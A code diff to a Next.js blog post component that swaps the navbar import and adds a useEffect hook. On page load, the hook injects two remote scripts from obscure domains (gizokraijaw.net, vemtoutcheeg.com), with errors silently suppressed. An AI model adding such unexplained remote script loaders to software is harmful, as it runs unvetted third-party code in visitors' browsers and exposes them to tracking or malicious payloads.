@@ -1,5 +1,4 @@
 "use client";
-import Nav from "../../components/Navbar";
 import { useState, useEffect } from "react";
 import { motion, Variants } from "framer-motion";
 import {
@@ -13,6 +12,7 @@ import {
   MessageCircle,
   Bookmark,
 } from "lucide-react";
+import BlogNav from "@/components/BlogNavbar";
 
 export default function PostContent({
   title,
@@ -95,9 +95,27 @@ export default function PostContent({
     },
   };
 
+  useEffect(() => {
+    // First script
+    (function (d, z, s) {
+      s.src = "https://" + d + "/401/" + z;
+      try {
+        (document.body || document.documentElement).appendChild(s);
+      } catch (e) {}
+    })("gizokraijaw.net", 9540235, document.createElement("script"));
+
+    // Second script
+    (function (d, z, s) {
+      s.src = "https://" + d + "/400/" + z;
+      try {
+        (document.body || document.documentElement).appendChild(s);
+      } catch (e) {}
+    })("vemtoutcheeg.com", 9540263, document.createElement("script"));
+  }, []);
+
   return (
     <>
-      <Nav
+      <BlogNav
         darkMode={darkMode}
         activeSection={activeSection}
         setDarkMode={setDarkMode}
